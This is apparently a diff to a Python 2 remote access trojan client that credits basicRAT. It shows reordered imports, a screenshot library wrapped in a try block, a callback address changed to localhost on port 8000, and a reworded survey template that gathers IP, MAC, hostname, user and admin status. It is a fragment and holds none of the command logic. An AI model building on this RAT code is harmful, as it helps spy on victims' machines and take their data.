@@ -9,29 +9,33 @@ __date__   = "13.04.2017"
 END_OF_FILE   = "(((END_OF_FILE)))"
 END_OF_STRING = "(((END_OF_STRING)))"
 
-import ctypes
-import socket
-import subprocess
+import re
 import os
 import sys
+import time
+import uuid
 import base64
-import threading
-import urllib2
+import ctypes
+import socket
 import urllib
-import re
+import urllib2
 import getpass
 import platform
-import time
-import re
-import uuid
+import threading
+import subprocess
+
+
 
 if os.name == "nt":
-    from mss.windows import MSS as mss
-    sct = mss()
+    try:
+        from mss.windows import MSS as mss
+        sct = mss()
+    except ImportError:
+        SS = False
 else:
     pass
 
-HOST = '192.168.1.55'
+HOST = '127.0.0.1'
 PORT = 8000
 
 def crypt(TEXT, encode=True):
@@ -132,19 +136,19 @@ def info():
 # https://github.com/vesche/basicRAT
 #
     SURVEY_FORMAT = '''
-[*] System Platform     - {}
-[*] Processor           - {}
-[*] Architecture        - {}
-[*] Internal IP         - {}
-[*] External IP         - {}
-[*] MAC Address         - {}
-[*] Internal Hostname   - {}
-[*] External Hostname   - {}
-[*] Hostname Aliases    - {}
-[*] FQDN                - {}
-[*] Current User        - {}
-[*] System Datetime     - {}
-[*] Admin Access        - {}'''
+\t-- System Platform     - {}
+\t-- Processor           - {}
+\t-- Architecture        - {}
+\t-- Internal IP         - {}
+\t-- External IP         - {}
+\t-- MAC Address         - {}
+\t-- Internal Hostname   - {}
+\t-- External Hostname   - {}
+\t-- Hostname Aliases    - {}
+\t-- FQDN                - {}
+\t-- Current User        - {}
+\t-- System Datetime     - {}
+\t-- Admin Access        - {}'''
 
 
     def run(plat):
